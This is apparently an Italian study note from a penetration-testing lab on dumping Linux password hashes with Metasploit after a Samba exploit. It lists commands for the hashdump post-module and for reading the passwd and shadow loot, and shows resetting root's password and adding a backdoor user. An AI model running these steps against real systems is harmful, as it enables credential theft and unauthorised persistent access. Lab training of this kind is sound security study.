# Dumping Hashes With Hashmap

<figure><img src="../../../.gitbook/assets/image (1215).png" alt=""><figcaption></figcaption></figure>

## Accesso iniziale

Non riporto la parte completa poiché ripetitivo e non è il focus.

Come al solito db\_nmap scan -> vulnerabilità samba sfruttata con modulo exploit is\_known\_pipename -> upgrade sessione da shell a meterpreter.

## Come fare hashdump

Non c'è il comando hashdump come per Windows quindi dobbiamo usare un modulo apposta di MSF. Per fare il dump degli hash degli utenti dobbiamo essere utenti root.

```
search hashdump
use post/linux/gather/hashdump
show options
set SESSION 3
run
loot
cat <passwd>
cat <shadowfile> //non contiene le password ma asterischi perché le password di quegli account non sono state configurate
sessions 3
shell
/bin/bash -i
passwd root //cambiamo la password di root
useradd -m alexis -s /bin/bash //aggiungiamo un nuovo utente
passwd alexis
CTRL+Z
run //ora il modulo ci restituisce utente:hashpassword:UID:GID::homedirectory:
cat <newunshadowedfile>
//nell'hash della password i primi 3 caratteri come ad esempio $6$ indicano il tipo di algoritmo di hash utilizzato,
// in particolare più è alto il numero più è sicuro. $6$ è sha512
```

<figure><img src="../../../.gitbook/assets/image (1217).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (1218).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (1219).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (1220).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (1221).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (1223).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (1222).png" alt=""><figcaption></figcaption></figure>

L'unica cosa che possiamo fare con gli hash è craccarli se possibile, se le password sono semplici. Non si può fare molto altro anche perché per avere gli hash devi già essere utente root quindi ormai non serve più autenticarsi come altri.
